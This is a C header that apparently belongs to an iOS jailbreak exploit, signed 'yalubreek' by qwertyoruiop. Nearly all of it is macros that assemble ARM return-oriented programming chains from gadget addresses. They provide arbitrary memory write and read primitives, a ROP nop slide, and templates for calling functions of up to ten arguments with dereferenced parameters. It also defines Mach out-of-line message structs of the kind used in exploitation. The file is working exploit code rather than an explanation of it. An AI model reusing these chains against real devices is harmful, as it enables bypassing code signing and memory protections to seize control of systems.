#ifndef defines_h
#define defines_h

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
    char oolrcvbuf[4096];
} oolmsgrcv_t;

#define InitMessage  "#yalubreek #unthreadedjb! lol code signatures! %d -qwertyoruiop\n"

#define StoreR0(push, where) \
push = (uint32_t)pop_r4r7pc;\
push = ((uint32_t)where) - 8;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch

#define Shift2R0(push) \
push = (uint32_t)lsrs_r0_2_popr4r5r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)0x45454545;\
push = (uint32_t)m_m_scratch

#define WriteWhatWhere(push, what, where)\
push = (uint32_t)pop_r0r1r3r5r7pc;\
push = (uint32_t)what;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x45454545;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
push = ((uint32_t)where) - 8;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch

#define LoadIntoR0(push, where)\
push = (uint32_t)pop_r0r1r3r5r7pc;\
push = (uint32_t)where - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x45454545; \
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch

#define DerefR0(push)\
push = pop_r2pc;\
push = -8;\
push = add_r0_r2_pop_r4r5r7pc;\
push = 0x44444444;\
push = 0x45454545;\
push = 0x47474747;\
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch

/////////////////////////////////////
/////////////////////////////////////
/////////////////////////////////////
/////////////////////////////////////

#define LoadStackFrameR0(push) \
tmp = (uint32_t)(segstackbase + (void*)stack - (void*)stackbase); \
push = pop_r0r1r3r5r7pc; \
push = (uint32_t)tmp; \
push = (uint32_t)0x11111111; \
push = (uint32_t)0x33333333; \
push = (uint32_t)0x45454545; \
push = (uint32_t)(m_m_scratch);

#define RopNopSlide(push) \
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc;\
push = (uint32_t)pop_r7pc;\
push = (uint32_t)pop_r4r7pc

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#define RopSetupLRClearParams(push, count) \
push = pop_r0r1r3r5r7pc;\
push = 0x40404040;\
push = pop_r2pc;\
push = 0x43434343;\
push = 0x45454545;\
push = (uint32_t)(m_m_scratch);\
push = pop_r4r7lr_bx_r1;\
push = 0x44444444;\
push = (uint32_t)(m_m_scratch);\
if (count < 5) \
    push = pop_r7pc; /* LR value */ \
else { \
    switch (count) { \
        case 5: \
            push = add_sp_4_pop_r7pc; \
            break; \
        case 6: \
            push = add_sp_8_pop_r7pc; \
            break; \
        case 7: \
            push = add_sp_C_pop_r7pc; \
            break; \
        case 8: \
            push = pop_r10r11_pop_r4r5r7pc; \
            break; \
        case 9: \
            push = add_sp_14_pop_r7pc; \
            break; \
        case 10: \
            push = pop_r8r10r11r4r5r6r7pc; \
            break; \
        case 12: \
            push = add_sp_c_pop_r8r10_pop_r4r5r6r7pc; \
            break; \
        default: \
            NSLog(@"Count upper than 10 is unsupported!"); \
            exit(1); \
            break; \
    } \
} \
push = (uint32_t)0x22222222

#define RopPtrFunctionKernel(push, ptr, a, b, c, d, e, f, g, h, i, l, count, magic) \
push = (uint32_t)pop_r0r1r2r3r5r7pc; \
push = (uint32_t)a; \
push = (uint32_t)b; \
push = (uint32_t)c; \
push = (uint32_t)d; \
push = 0x45454545; \
push = (uint32_t)(m_m_scratch); \
push = (uint32_t)ptr;\
switch (count) { \
    case 0: \
    case 1: \
    case 2: \
    case 3: \
    case 4: \
        push = (uint32_t)magic;\
        break; \
    case 5: \
        push = (uint32_t)e; \
        push = (uint32_t)magic;\
        break; \
    case 6: \
        push = (uint32_t)e; \
        push = (uint32_t)f; \
        push = (uint32_t)magic;\
        break; \
    case 7: \
        push = (uint32_t)e; \
        push = (uint32_t)f; \
        push = (uint32_t)g; \
        push = (uint32_t)magic;\
        break; \
    case 8: \
        push = (uint32_t)e; \
        push = (uint32_t)f; \
        push = (uint32_t)g; \
        push = (uint32_t)h; \
        push = (uint32_t)magic;\
        break; \
    case 9: \
        push = (uint32_t)e; \
        push = (uint32_t)f; \
        push = (uint32_t)g; \
        push = (uint32_t)h; \
        push = (uint32_t)i; \
        push = (uint32_t)magic;\
        break; \
    case 10: \
        push = (uint32_t)e; \
        push = (uint32_t)f; \
        push = (uint32_t)g; \
        push = (uint32_t)h; \
        push = (uint32_t)i; \
        push = (uint32_t)l; \
        push = (uint32_t)magic;\
        break; \
    default: \
        NSLog(@"Count upper than 10 is unsupported!"); \
        exit(1); \
        break; \
}

#define RopFunctionKernel(push, name, a, b, c, d, e, f, g, h, i, l, count, magic) \
assert((uint32_t)[dy solveSymbol:name]);\
RopPtrFunctionKernel(push, [dy solveSymbol:name], a, b, c, d, e, f, g, h, i, l, count, magic) \

#define DerefParam(push, repl_arg, read_ptr, position) \
push = (uint32_t)pop_r0r1r3r5r7pc;\
push = (uint32_t)read_ptr - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x45454545;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = ((repl_arg < 4) ? (4*(14 * position + repl_arg + 6)) : (4*(14 * position + repl_arg + 9))) + GET_STACK_TOP;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch;\

// should be after ALL DerefParams
#define DerefFunctionPointer(push, fptr_deref) \
push = (uint32_t)pop_r0r1r3r5r7pc;\
push = (uint32_t)fptr_deref - 8;\
push = (uint32_t)0x11111111;\
push = (uint32_t)0x33333333;\
push = (uint32_t)0x45454545;\
push = (uint32_t)m_m_scratch; \
push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
push = (uint32_t)m_m_scratch;\
push = (uint32_t)pop_r4r7pc;\
tmp = (4*12) + (((char*)stack) - ((char*)stackbase)) + segstackbase;\
push = (uint32_t)tmp  - 8; \
push = (uint32_t)m_m_scratch;\
push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
push = (uint32_t)0x44444444;\
push = (uint32_t)m_m_scratch

// simple functions temlpate
#define RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
RopFunctionKernel(push, name, a, b, c, d, e, f, g, h, i, l, count, magic)

// deref functions templates
#define RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 0); \
RopFunctionKernel(push, name, a, b, c, d, e, f, g, h, i, l, count, magic)

#define RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 1); \
DerefParam(push, repl_arg_1, read_ptr_1, 0); \
RopFunctionKernel(push, name, a, b, c, d, e, f, g, h, i, l, count, magic)

#define RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 2); \
DerefParam(push, repl_arg_1, read_ptr_1, 1); \
DerefParam(push, repl_arg_2, read_ptr_2, 0); \
RopFunctionKernel(push, name, a, b, c, d, e, f, g, h, i, l, count, magic)

// pointer deref functions templates

#define RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefFunctionPointer(push, fptr_deref); \
RopPtrFunctionKernel(push, 0x13371337, a, b, c, d, e, f, g, h, i, l, count, magic)

#define RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 1); \
DerefFunctionPointer(push, fptr_deref); \
RopPtrFunctionKernel(push, 0x13371337, a, b, c, d, e, f, g, h, i, l, count, magic)

#define RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 2); \
DerefParam(push, repl_arg_1, read_ptr_1, 1); \
DerefFunctionPointer(push, fptr_deref); \
RopPtrFunctionKernel(push, 0x13371337, a, b, c, d, e, f, g, h, i, l, count, magic)

#define RopCallDerefFunctionPointerUp10CountDeref3(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i, l, count, magic) \
RopSetupLRClearParams(push, count); \
DerefParam(push, repl_arg_0, read_ptr_0, 3); \
DerefParam(push, repl_arg_1, read_ptr_1, 2); \
DerefParam(push, repl_arg_2, read_ptr_2, 1); \
DerefFunctionPointer(push, fptr_deref); \
RopPtrFunctionKernel(push, 0x13371337, a, b, c, d, e, f, g, h, i, l, count, magic)

#define SIMPLE_FUNC         0x10000000
#define DEREF_PTR_FUNC      0x20000000
#define CUSTON_FUNC         0x30000000

#define DEREF0              0x00010000
#define DEREF1              0x00020000
#define DEREF2              0x00030000
#define DEREF3              0x00040000

#define F_ARGS_0            0x00000000
#define F_ARGS_1            0x00000001
#define F_ARGS_2            0x00000002
#define F_ARGS_3            0x00000003
#define F_ARGS_4            0x00000004
#define F_ARGS_5            0x00000005
#define F_ARGS_6            0x00000006
#define F_ARGS_7            0x00000007
#define F_ARGS_8            0x00000008
#define F_ARGS_9            0x00000009
#define F_ARGS_10           0x00000010


#define S_D0_F (SIMPLE_FUNC | DEREF0)
#define S_D1_F (SIMPLE_FUNC | DEREF1)
#define S_D2_F (SIMPLE_FUNC | DEREF2)
#define S_D3_F (SIMPLE_FUNC | DEREF3)
#define D_D0_F (DEREF_PTR_FUNC | DEREF0)
#define D_D1_F (DEREF_PTR_FUNC | DEREF1)
#define D_D2_F (DEREF_PTR_FUNC | DEREF2)
#define D_D3_F (DEREF_PTR_FUNC | DEREF3)

//
// Simple functions
//

#define RopCallFunction10(push, name, a, b, c, d, e, f, g, h, i, l)  RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, g, h, i, l,10, S_D0_F | F_ARGS_10)
#define RopCallFunction9( push, name, a, b, c, d, e, f, g, h, i)     RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, g, h, i, 0, 9, S_D0_F | F_ARGS_9)
#define RopCallFunction8( push, name, a, b, c, d, e, f, g, h)        RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, g, h, 0, 0, 8, S_D0_F | F_ARGS_8)
#define RopCallFunction7( push, name, a, b, c, d, e, f, g)           RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, g, 0, 0, 0, 7, S_D0_F | F_ARGS_7)
#define RopCallFunction6( push, name, a, b, c, d, e, f)              RopCallFunctionUp10Count(push, name, a, b, c, d, e, f, 0, 0, 0, 0, 6, S_D0_F | F_ARGS_6)
#define RopCallFunction5( push, name, a, b, c, d, e)                 RopCallFunctionUp10Count(push, name, a, b, c, d, e, 0, 0, 0, 0, 0, 5, S_D0_F | F_ARGS_5)
#define RopCallFunction4( push, name, a, b, c, d)                    RopCallFunctionUp10Count(push, name, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, S_D0_F | F_ARGS_4)
#define RopCallFunction3( push, name, a, b, c)                       RopCallFunctionUp10Count(push, name, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, S_D0_F | F_ARGS_3)
#define RopCallFunction2( push, name, a, b)                          RopCallFunctionUp10Count(push, name, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, S_D0_F | F_ARGS_2)
#define RopCallFunction1( push, name, a)                             RopCallFunctionUp10Count(push, name, a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, S_D0_F | F_ARGS_1)
#define RopCallFunction0( push, name)                                RopCallFunctionUp10Count(push, name, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, S_D0_F | F_ARGS_0)

//
// Deref 1 args functions
//

#define RopCallFunction10Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l,10, S_D1_F | F_ARGS_10)
#define RopCallFunction9Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, 0, 9, S_D1_F | F_ARGS_9)
#define RopCallFunction8Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, 0, 0, 8, S_D1_F | F_ARGS_8)
#define RopCallFunction7Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, 0, 0, 0, 7, S_D1_F | F_ARGS_7)
#define RopCallFunction6Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, 0, 0, 0, 0, 6, S_D1_F | F_ARGS_6)
#define RopCallFunction5Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d, e) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, 0, 0, 0, 0, 0, 5, S_D1_F | F_ARGS_5)
#define RopCallFunction4Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c, d) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, S_D1_F | F_ARGS_4)
#define RopCallFunction3Deref1(    push, name, repl_arg_0, read_ptr_0, a, b, c) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, S_D1_F | F_ARGS_3)
#define RopCallFunction2Deref1(    push, name, repl_arg_0, read_ptr_0, a, b) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, S_D1_F | F_ARGS_2)
#define RopCallFunction1Deref1(    push, name, repl_arg_0, read_ptr_0, a) \
    RopCallFunctionUp10CountDeref1(push, name, repl_arg_0, read_ptr_0, a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, S_D1_F | F_ARGS_1)

//
// Deref 2 args functions
//

#define RopCallFunction10Deref2(   push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l,10, S_D2_F | F_ARGS_10)
#define RopCallFunction9Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, 0, 9, S_D2_F | F_ARGS_9)
#define RopCallFunction8Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, 0, 0, 8, S_D2_F | F_ARGS_8)
#define RopCallFunction7Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, 0, 0, 0, 7, S_D2_F | F_ARGS_7)
#define RopCallFunction6Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, 0, 0, 0, 0, 6, S_D2_F | F_ARGS_6)
#define RopCallFunction5Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, 0, 0, 0, 0, 0, 5, S_D2_F | F_ARGS_5)
#define RopCallFunction4Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, S_D2_F | F_ARGS_4)
#define RopCallFunction3Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, S_D2_F | F_ARGS_3)
#define RopCallFunction2Deref2(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b) \
    RopCallFunctionUp10CountDeref2(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, S_D2_F | F_ARGS_2)

//
// Deref 3 args functions
//

#define RopCallFunction10Deref3(   push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i, l) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i, l,10, S_D3_F | F_ARGS_10)
#define RopCallFunction9Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i, 0, 9, S_D3_F | F_ARGS_9)
#define RopCallFunction8Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, 0, 0, 8, S_D3_F | F_ARGS_8)
#define RopCallFunction7Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, 0, 0, 0, 7, S_D3_F | F_ARGS_7)
#define RopCallFunction6Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, 0, 0, 0, 0, 6, S_D3_F | F_ARGS_6)
#define RopCallFunction5Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, 0, 0, 0, 0, 0, 5, S_D3_F | F_ARGS_5)
#define RopCallFunction4Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, S_D3_F | F_ARGS_4)
#define RopCallFunction3Deref3(    push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c) \
    RopCallFunctionUp10CountDeref3(push, name, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, S_D3_F | F_ARGS_3)

//
// pointer deref functions
//

#define RopCallDerefFunctionPointer10(   push, fptr_deref, a, b, c, d, e, f, g, h, i, l) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, g, h, i, l,10, D_D0_F | F_ARGS_10)
#define RopCallDerefFunctionPointer9(    push, fptr_deref, a, b, c, d, e, f, g, h, i) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, g, h, i, 0, 9, D_D0_F | F_ARGS_9)
#define RopCallDerefFunctionPointer8(    push, fptr_deref, a, b, c, d, e, f, g, h) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, g, h, 0, 0, 8, D_D0_F | F_ARGS_8)
#define RopCallDerefFunctionPointer7(    push, fptr_deref, a, b, c, d, e, f, g) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, g, 0, 0, 0, 7, D_D0_F | F_ARGS_7)
#define RopCallDerefFunctionPointer6(    push, fptr_deref, a, b, c, d, e, f) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, f, 0, 0, 0, 0, 6, D_D0_F | F_ARGS_6)
#define RopCallDerefFunctionPointer5(    push, fptr_deref, a, b, c, d, e) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, e, 0, 0, 0, 0, 0, 5, D_D0_F | F_ARGS_5)
#define RopCallDerefFunctionPointer4(    push, fptr_deref, a, b, c, d) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, D_D0_F | F_ARGS_4)
#define RopCallDerefFunctionPointer3(    push, fptr_deref, a, b, c) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, D_D0_F | F_ARGS_3)
#define RopCallDerefFunctionPointer2(    push, fptr_deref, a, b) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, D_D0_F | F_ARGS_2)
#define RopCallDerefFunctionPointer1(    push, fptr_deref, a) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, D_D0_F | F_ARGS_1)
#define RopCallDerefFunctionPointer0(    push, fptr_deref) \
RopCallDerefFunctionPointerUp10Count(push, fptr_deref, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, D_D0_F | F_ARGS_0)


//
// pointer deref 1 args functions
//

#define RopCallDerefFunctionPointer10Deref1(   push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l,10, D_D1_F | F_ARGS_10)
#define RopCallDerefFunctionPointer9Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, 0, 9, D_D1_F | F_ARGS_9)
#define RopCallDerefFunctionPointer8Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, 0, 0, 8, D_D1_F | F_ARGS_8)
#define RopCallDerefFunctionPointer7Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, 0, 0, 0, 7, D_D1_F | F_ARGS_7)
#define RopCallDerefFunctionPointer6Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, 0, 0, 0, 0, 6, D_D1_F | F_ARGS_6)
#define RopCallDerefFunctionPointer5Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, e, f, 0, 0, 0, 0, 5, D_D1_F | F_ARGS_5)
#define RopCallDerefFunctionPointer4Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, d, 0, 0, 0, 0, 0, 0, 4, D_D1_F | F_ARGS_4)
#define RopCallDerefFunctionPointer3Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, c, 0, 0, 0, 0, 0, 0, 0, 3, D_D1_F | F_ARGS_3)
#define RopCallDerefFunctionPointer2Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a, b) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, b, 0, 0, 0, 0, 0, 0, 0, 0, 2, D_D1_F | F_ARGS_2)
#define RopCallDerefFunctionPointer1Deref1(    push, fptr_deref, repl_arg_0, read_ptr_0, a) \
    RopCallDerefFunctionPointerUp10CountDeref1(push, fptr_deref, repl_arg_0, read_ptr_0, a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, D_D1_F | F_ARGS_1)

//
// pointer deref 2 args functions
//

#define RopCallDerefFunctionPointer10Deref2(   push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l,10, D_D2_F | F_ARGS_10)
#define RopCallDerefFunctionPointer9Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, 0, 9, D_D2_F | F_ARGS_9)
#define RopCallDerefFunctionPointer8Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, 0, 0, 8, D_D2_F | F_ARGS_8)
#define RopCallDerefFunctionPointer7Deref2(    push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g) \
    RopCallDerefFunctionPointerUp10CountDeref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, 0, 0, 0, 7, D_D2_F | F_ARGS_7)
